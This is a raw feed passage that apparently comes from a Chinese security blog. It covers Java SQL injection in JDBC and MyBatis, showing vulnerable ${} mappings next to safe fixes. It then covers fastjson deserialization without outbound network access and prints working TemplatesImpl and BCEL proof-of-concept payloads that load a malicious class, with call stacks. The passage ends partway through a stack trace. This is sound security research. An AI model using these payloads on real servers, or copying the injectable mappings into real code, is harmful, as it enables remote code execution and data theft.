class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ApiOperation(value = &quot;safe: order by 参数白名单过滤&quot;)</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/safe5&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">safe5</span><span class="params">(String column)</span> &#123;</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 限制column参数只能是id、username、password三者之一</span></span><br><span class="line">    Set&lt;String&gt; allowedFields = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;(Arrays.asList(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;username&quot;</span>, <span class="string">&quot;password&quot;</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (allowedFields.contains(column)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">            <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(db_url, db_user, db_pass);</span><br><span class="line">            <span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line">        <span class="comment">// 动态拼接用户参数</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users order by &quot;</span> + column;</span><br><span class="line">            log.info(<span class="string">&quot;[safe] 执行SQL语句： &#123;&#125;&quot;</span>, sql);</span><br><span class="line">            </span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(sql);</span><br><span class="line">            <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">info</span> <span class="operator">=</span> String.format(<span class="string">&quot;查询结果 %s: %s&quot;</span>, rs.getString(<span class="string">&quot;user&quot;</span>), rs.getString(<span class="string">&quot;pass&quot;</span>));</span><br><span class="line">                result.append(info);</span><br><span class="line">            &#125;</span><br><span class="line">            rs.close();</span><br><span class="line">            stmt.close();</span><br><span class="line">            conn.close();</span><br><span class="line">            <span class="keyword">return</span> result.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Mybatis-漏洞点"><a href="#Mybatis-漏洞点" class="headerlink" title="Mybatis 漏洞点"></a>Mybatis 漏洞点</h2><p>Mybatis &#x2F; Mybatis plus 是目前比较新的数据库操作方式，它提供了 xml配置 &#x2F; mapper接口注解 两种映射方式，结合赖注入可以实现非常简洁的数据库调用。（个人更喜欢注解方式）</p><p>xml配置方式<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/7a57f0fb6a0f46f4aa602c81a792d032.png"></p><p>mapper接口注解方式<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/4d2288faf8b839dc993960f4b66d46b6.png"></p><h3 id="动态拼接参数-1"><a href="#动态拼接参数-1" class="headerlink" title="动态拼接参数"></a>动态拼接参数</h3><h4 id="漏洞成因-3"><a href="#漏洞成因-3" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>Mybatis 和 JDBC 类似，有传参的预编译和非预编译之分。一般 来说，<code>#&#123;param&#125;</code> 会被转义，而 <code>$&#123;param&#125;</code> 则会直接注入。</p><p>所以如果开发人员使用到 <code>$&#123;&#125;</code>并且传参用户可控，那么就会造成 SQL 注入。特别地，由于 order by、like 和 in 关键字在使用 <code>#&#123;&#125;</code> 做转义时会报错，所以开发者容易下意识选择 <code>$&#123;&#125;</code> 解决问题，进而加大了 Mybatis 出现 SQL 注入的可能。</p><p>常见的漏洞代码如下，总共有：</p><p>1.使用 xml 映射方式，传参使用 <code>$&#123;&#125;</code></p><figure class="highlight xml"><figcaption><span>title:"UserMapper.xml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- id的值必须和数据处理层的接口名一致 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;orderBy&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.best.hello.entity.User&quot;</span>&gt;</span></span><br><span class="line">select *</span><br><span class="line">from users</span><br><span class="line">order by $&#123;field&#125; $&#123;sort&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><figcaption><span>title:"UserMapper.java"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line"></span><br><span class="line">    List&lt;User&gt; <span class="title function_">orderBy</span><span class="params">(String field, String sort)</span>;</span><br><span class="line">    List&lt;User&gt; <span class="title function_">orderBySafe</span><span class="params">(String field)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.使用接口注解方式，传参使用 <code>$&#123;&#125;</code></p><figure class="highlight java"><figcaption><span>title:"UserMapper.java"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 参数动态拼接</span></span><br><span class="line">    <span class="meta">@Select(&quot;select * from users where id = $&#123;id&#125;&quot;)</span></span><br><span class="line">    List&lt;User&gt; <span class="title function_">queryByIdAsString</span><span class="params">(<span class="meta">@Param(&quot;id&quot;)</span> String id)</span>;</span><br><span class="line">    <span class="comment">// 2. order by关键字注入，使用 #&#123;&#125; 会产生报错，因此容易写成 $&#123;&#125;</span></span><br><span class="line">    <span class="meta">@Select(&quot;select * from users order by $&#123;field&#125; $&#123;sort&#125;&quot;)</span></span><br><span class="line">    List&lt;User&gt; <span class="title function_">orderBy2</span><span class="params">(<span class="meta">@Param(&quot;field&quot;)</span> String field, <span class="meta">@Param(&quot;sort&quot;)</span> String sort)</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 3. like关键字注入，搜索时使用 &#x27;%#&#123;q&#125;%&#x27; 会报错，因此容易写成 $&#123;&#125;</span></span><br><span class="line">    <span class="meta">@Select(&quot;select * from users where user like &#x27;%$&#123;user&#125;%&#x27;&quot;)</span></span><br><span class="line">    List&lt;User&gt; <span class="title function_">searchVul</span><span class="params">(String user)</span>;</span><br><span class="line">    <span class="comment">// 4. in关键字注入, 搜索时使用 &#x27;%#&#123;q&#125;%&#x27; 会报错，因此容易写成 $&#123;&#125;</span></span><br><span class="line">    <span class="meta">@Select(&quot;select * from users where id in ($&#123;ids&#125;)&quot;)</span></span><br><span class="line">    List&lt;User&gt; <span class="title function_">queryIdInIds</span><span class="params">(<span class="meta">@Param(&quot;ids&quot;)</span> String ids)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="防御思路-3"><a href="#防御思路-3" class="headerlink" title="防御思路"></a>防御思路</h4><p>对于直接动态拼接，把 <code>$&#123;&#125;</code> 改成 <code>#&#123;&#125;</code>即可；对于 order by、like、in 等关键字，由于报错问题，需要微调写法。</p><p>动态拼接安全代码，直接替换即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Select(&quot;select * from users where id = #&#123;id&#125;&quot;)</span></span><br><span class="line">    List&lt;User&gt; <span class="title function_">queryByIdAsString</span><span class="params">(<span class="meta">@Param(&quot;id&quot;)</span> String id)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>order by 注入安全代码，通过 choose 标签设置 filed 白名单，然后再做对应处理去解决这个问题</p><figure class="highlight xml"><figcaption><span>title:"UserMapper.xml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;orderBySafe&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.best.hello.entity.User&quot;</span>&gt;</span></span><br><span class="line">select * from users</span><br><span class="line"><span class="tag">&lt;<span class="name">choose</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">&quot;field == &#x27;id&#x27;&quot;</span>&gt;</span></span><br><span class="line">order by id desc</span><br><span class="line"><span class="tag">&lt;/<span class="name">when</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">&quot;field == &#x27;user&#x27;&quot;</span>&gt;</span></span><br><span class="line">order by user desc</span><br><span class="line"><span class="tag">&lt;/<span class="name">when</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">otherwise</span>&gt;</span></span><br><span class="line">order by pass desc limit 2</span><br><span class="line"><span class="tag">&lt;/<span class="name">otherwise</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">choose</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>like 注入安全代码，需要使用 concat 做字符串拼接，否则会报错的</p><figure class="highlight java"><figcaption><span>title:"UserMapper.java"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;    </span><br><span class="line"><span class="meta">@Select(&quot;select * from users where user like CONCAT(&#x27;%&#x27;, #&#123;user&#125;, &#x27;%&#x27;)&quot;)</span>  </span><br><span class="line">List&lt;User&gt; <span class="title function_">searchSafe</span><span class="params">(<span class="meta">@Param(&quot;user&quot;)</span> String user)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>in 注入安全代码，需要使用到 foreach 标签</p><figure class="highlight xml"><figcaption><span>title:"UserMapper.xml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;findByUserNameVuln04&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;String&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">    select * from users where id in</span><br><span class="line">    <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;ids&quot;</span> <span class="attr">item</span>=<span class="string">&quot;item&quot;</span> <span class="attr">open</span>=<span class="string">&quot;(&quot;</span><span class="attr">separatosr</span>=<span class="string">&quot;,&quot;</span> <span class="attr">close</span>=<span class="string">&quot;)&quot;</span>&gt;</span>#&#123;ids&#125; <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Java SQL 注入漏洞比较有意思的地方是，Java 由于 Mybatis 的存在，对数据库操作进一步封装的同时，却不支持例如 order by 语句的预编译，导致开发者会偏向于使用更为”便捷“的 <code>$&#123;&#125;</code>，进而导致漏洞产生。 </p><p>当然值得庆幸的是，Mybatis Plus 目前已经支持上述语句的预编译，所以及时更新组件也是漏洞防御一大重点；不过也需要考虑项目兼容性和供应链安全的问题。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://github.com/j3ers3/Hello-Java-Sec">https://github.com/j3ers3/Hello-Java-Sec</a></li><li><a href="https://tttang.com/archive/1726/">https://tttang.com/archive/1726/</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本文主要对 Java 下 SQLI 的漏洞成因、防御思路做了分析总结，方便理清代码审计时的思路，漏洞样例代码参考自 &lt;a href=&quot;htt</summary>
      
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="代码审计" scheme="https://jaspersec.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="SQL注入" scheme="https://jaspersec.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>fastjson反序列化 不出网利用</title>
    <link href="https://jaspersec.top/posts/3821091475.html"/>
    <id>https://jaspersec.top/posts/3821091475.html</id>
    <published>2025-03-15T04:32:20.000Z</published>
    <updated>2025-03-31T22:09:47.239Z</updated>
    
    <content type="html"><![CDATA[<h2 id="TemplatesImpl-链"><a href="#TemplatesImpl-链" class="headerlink" title="TemplatesImpl 链"></a>TemplatesImpl 链</h2><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>fastjson &lt;&#x3D; 1.2.24</p><p>缺点： 代码要开 Feature，因为CC3的后半段的字段都是public的，默认不支持，所以挺鸡肋的。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞本质：source 为 <code>TemplatesImpl#getOutputProperties</code>，通过 fastjson 触发；sink 就是正常的CC3后半段链子，实现动态类加载，并且可以把恶意类写入 _bytecodes，从而实现不出网利用。</p><p>构造Exp的代码如下：</p><figure class="highlight java"><figcaption><span>title:"Poc.java"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc.templatesImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: Fastjson</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: poc for fastjson 1.2.24</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: Jasper_sec</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span>: 2025-04-01 03:46</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC_1_2_24</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">codes</span> <span class="operator">=</span> ClassFile2Base64(<span class="string">&quot;D:\\Security\\JavaSec\\EvilClass\\Calc.class&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> String.format(<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;%s\&quot;,\&quot;_bytecodes\&quot;: [\&quot;%s\&quot;],&#x27;_name&#x27;:&#x27;jasper&#x27;,&#x27;_tfactory&#x27;:&#123;&#125;,&#x27;_outputProperties&#x27;:&#123;&#125;&#125;&quot;</span>, className,codes);</span><br><span class="line">        JSON.parse(exp, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">ClassFile2Base64</span><span class="params">(String filePath)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filePath);</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> n;</span><br><span class="line">            <span class="keyword">while</span>((n = fis.read(b))!=-<span class="number">1</span>) &#123;</span><br><span class="line">                bos.write(b,<span class="number">0</span>,n);</span><br><span class="line">            &#125;</span><br><span class="line">            fis.close();</span><br><span class="line">            bos.close();</span><br><span class="line">            buffer = bos.toByteArray();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> encoder.encodeToString(buffer);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数调用栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">bytesValue:112, JSONScanner</span><br><span class="line">deserialze:136, ObjectArrayCodec</span><br><span class="line">parseArray:723, DefaultJSONParser</span><br><span class="line">deserialze:177, ObjectArrayCodec</span><br><span class="line">parseField:71, DefaultFieldDeserializer</span><br><span class="line">parseField:773, JavaBeanDeserializer</span><br><span class="line">deserialze:600, JavaBeanDeserializer</span><br><span class="line">deserialze:188, JavaBeanDeserializer</span><br><span class="line">deserialze:184, JavaBeanDeserializer</span><br><span class="line">parseObject:368, DefaultJSONParser</span><br><span class="line">parse:1327, DefaultJSONParser</span><br><span class="line">parse:1293, DefaultJSONParser</span><br><span class="line">parse:137, JSON</span><br><span class="line">parse:193, JSON</span><br><span class="line">main:13, Test1TemplatesImpl</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="BCEL-链"><a href="#BCEL-链" class="headerlink" title="BCEL 链"></a>BCEL 链</h2><p>本质：实际就是 bcel 的 classloader 支持携带字节码进行类加载，所以用这个类可以不用访问外网实现类加载。</p><h3 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h3><ul><li>fastjson &lt;&#x3D; 1.2.47 or fastjson &lt;&#x3D; 1.2.24</li><li>jdk &lt; 8u251</li></ul><p>漏洞所需依赖有下面两种，实际上只要有tomcat就可以了，因为tomcat自带tomcat-dbcp依赖：</p><p>tomcat 依赖，注意 payload 变化：&lt;&#x3D;tomcat7 source点是 <code>org.apache.tomcat.dbcp.dbcp.BasicDataSource</code>、&gt;&#x3D;tomcat8 source点 是 <code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dbcp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.0.53<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>commons-dbcp 依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-dbcp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-dbcp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意：poc 也分两种， <strong>fastjson 的不同版本，对应的 payload 构造和 source 点也不同</strong>。</p><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>bcel exp for fastjson &lt;&#x3D; 1.2.24</p><figure class="highlight java"><figcaption><span>title:"poc.java"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc.bcel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: Fastjson</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: bcel for fastjson &lt;= 1.2.24</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: Jasper_sec</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span>: 2025-03-15 14:56</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC_1_2_24</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// jdk &lt; 8u251</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">evilClass</span> <span class="operator">=</span> <span class="string">&quot;D:\\Security\\JavaSec\\EvilClass\\Evil.class&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> file2bcelcode(evilClass);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span></span><br><span class="line">                <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\n&quot;</span> +<span class="comment">/*此处Tomcat7 org.apache.tomcat.dbcp.dbcp.BasicDataSource、Tomcat8及以后 org.apache.tomcat.dbcp.dbcp2.BasicDataSource*/</span></span><br><span class="line">                        <span class="string">&quot;    \&quot;driverClassLoader\&quot;: &#123;\&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;,\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    \&quot;driverClassName\&quot;: \&quot;$$BCEL$$&quot;</span>+ code +<span class="string">&quot;\&quot;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&#125;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">file2bcelcode</span><span class="params">(String classFilePath)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytecode = Files.readAllBytes(Paths.get(classFilePath));</span><br><span class="line">        <span class="keyword">return</span> Utility.encode(bytecode, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一个经典的 fastjson 调用 getter，source 点是 <code>BasicDataSource#getConnection</code> ，同时设置 ClassLoader为bcel，sink 点是 <code>BasicDataSource#createConnectionFactory</code>。</p><p><strong>bcel 可以不出网进行动态类加载的原因</strong>：在 <code>com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass</code> 中，如果 <code>class_name</code> 以 <code>$$BCEL$$</code> 开头，则会读取 <code>class_name</code> 后面的字节码并调用 <code>define_class</code> 进行类的加载。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/c42e36f083d06cb469e2bb1824e8548d.png"></p><p><strong>所以攻击者可以把字节码写进 payload 里，从而实现不出网的动态类加载。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">defineClass:642, ClassLoader 